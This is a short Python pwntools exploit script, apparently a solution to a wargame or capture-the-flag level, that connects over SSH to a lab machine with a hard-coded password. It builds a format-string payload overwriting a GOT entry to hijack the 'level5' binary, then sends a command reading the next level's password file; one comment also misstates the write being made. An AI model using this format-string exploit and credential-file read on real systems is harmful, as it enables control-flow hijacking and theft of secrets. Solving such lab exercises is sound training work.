from pwn import *


# Change host according to your configuration
s = ssh(
    user="level5",
    host="192.168.56.8",
    password="0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a",
    port=4242
)

elf = s.ELF('/home/user/level5/level5')

print(elf.got['exit'])

# the format string offset
offset = 4

# the writes you want to perform
writes = {
    0x8049838: 0x080484a4,  # write 0x40 at 0x804988c
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)

p = s.process("/home/user/level5/level5")
p.writeline(payload)
p.writeline("cat /home/user/level6/.pass")

#p.interactive()
p.stream()

p.close()
s.close()
